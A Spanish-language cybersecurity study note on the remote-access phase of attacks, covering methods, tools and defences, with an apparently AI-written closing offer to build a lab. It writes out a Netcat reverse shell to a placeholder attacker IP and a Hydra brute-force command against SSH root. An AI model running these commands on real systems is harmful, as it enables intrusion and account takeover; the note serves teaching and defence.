---
title: "Acceso Remoto"
date: 2026-01-26
tags:
  - ciberseguridad
  - redes-protocolos
  - vulnerabilidades-y-amenazas
---
### Acceso Remoto – Nota expandida


> **Relacionado**: [[01-Ciberseguridad/Herramientas/Hydra|Hydra]]. [[01-Ciberseguridad/Herramientas/IDOR|IDOR]]. [[01-Ciberseguridad/Herramientas/Netcat|Netcat]]. [[01-Ciberseguridad/Herramientas/SHELLSHOCK|SHELLSHOCK]]. [[02-Ciencias-Computacion/Redes/Herramientas|Herramientas]].

**Acceso remoto** es la fase de un ataque en la que el atacante **logra ejecutar comandos o software en la máquina objetivo desde otro sistema**. Es uno de los **momentos clave** del proceso ofensivo, ya que marca el punto de **compromiso activo del sistema**. Este acceso puede ser temporal o persistente, limitado o total, y con privilegios bajos o de administrador.

---

###  Objetivos del acceso remoto

- **Obtener una shell** o entorno interactivo en el sistema víctima.
    
- **Ejecutar comandos** arbitrarios para moverse, recopilar datos o escalar privilegios.
    
- **Desplegar herramientas o malware** adicional (sniffers, keyloggers, ransomware...).
    
- **Persistir** en el sistema para volver a acceder más adelante.
    

---

###  Métodos comunes para conseguir acceso remoto

#### 1. **Explotación de servicios vulnerables**

- Se aprovechan fallos en servicios accesibles desde el exterior.
    
- Ejemplos:
    
    - Overflow en FTP, HTTP, SMB...
        
    - Errores de validación (RCE).
        
    - Vulnerabilidades conocidas como **Shellshock**, **Log4Shell**, **EternalBlue**, etc.
        

#### 2. **Fuerza bruta o diccionario**

- Servicios como SSH, FTP o Telnet permiten autenticación.
    
- El atacante prueba múltiples combinaciones hasta acceder.
    
    - Herramientas: `Hydra`, `Medusa`, `Brutus`.
        

#### 3. **Ingeniería social / phishing**

- El usuario ejecuta un archivo o clic en un enlace que establece una conexión inversa (reverse shell).
    

#### 4. **Canales de administración mal protegidos**

- Escritorio remoto (RDP), VNC, SSH con credenciales débiles.
    
- Routers con Telnet abierto y sin contraseña.
    

#### 5. **Shells inversas o bind shells**

- El atacante prepara un servidor a la escucha:
    
    - Shell inversa: la víctima se conecta al atacante.
        
    - Bind shell: el atacante se conecta a un puerto abierto por la víctima.
        

---

###  Ejemplo de acceso con Netcat (reverse shell)

#### En la máquina atacante:

```bash
nc -lvnp 4444
```

#### En la víctima (tras explotación):

```bash
nc <IP_atacante> 4444 -e /bin/bash
```

> Resultado: el atacante tiene una shell interactiva en el sistema víctima.

---

### ️ Herramientas comunes para acceso remoto

|Herramienta|Descripción|
|---|---|
|**Netcat (nc)**|Transferencia de archivos, bind/reverse shells.|
|**Metasploit**|Framework completo de explotación y post-explotación.|
|**SSH**|Acceso remoto legítimo (si se consigue usuario/clave).|
|**PowerShell remoting**|En redes Windows, para moverse lateralmente.|
|**Web shells**|Cargar `cmd.php`, `shell.jsp`, etc., en servidores web vulnerables.|

---

###  Consideraciones defensivas

1. **Reducir la superficie de ataque**:
    
    - Desactivar servicios innecesarios (Telnet, RDP, FTP…).
        
    - Reforzar servicios necesarios (SSH con 2FA, puertos no estándar).
        
2. **Limitar el acceso externo**:
    
    - Uso de VPNs para la administración remota.
        
    - Listas de control de acceso (ACL) por IP.
        
3. **Monitorizar intentos de conexión**:
    
    - Fallos de autenticación, uso de credenciales inválidas.
        
    - Conexiones a puertos no usuales.
        
4. **Hardened defaults**:
    
    - Políticas de bloqueo tras varios intentos fallidos.
        
    - Cuentas sin acceso remoto.
        
5. **IDS/IPS y honeypots**:
    
    - Detectan y bloquean intentos de acceso remoto indebido.
        
    - Ejemplo: `Cowrie`, honeypot SSH que simula una shell real.
        

---

###  Ejemplo de ataque típico

> Objetivo: `192.168.1.10`, puerto 22 abierto (SSH)

```bash
nmap -sS -p 22 -sV 192.168.1.10
```

️ Se detecta: `OpenSSH 7.2p2`

→ El atacante usa `Hydra`:

```bash
hydra -l root -P rockyou.txt ssh://192.168.1.10
```

Si tiene éxito → acceso remoto como root.

---

### Conclusión

El **acceso remoto marca el inicio del control real sobre un sistema**. Puede lograrse por múltiples vías, desde fallos de software hasta errores humanos. Detectarlo a tiempo es clave para contener un ataque, y evitarlo requiere **reducción de exposición, protección de credenciales y monitoreo constante**.

---

¿Te interesa que te prepare un laboratorio simulado con metasploitable y pruebas de acceso remoto con Netcat, SSH y web shells?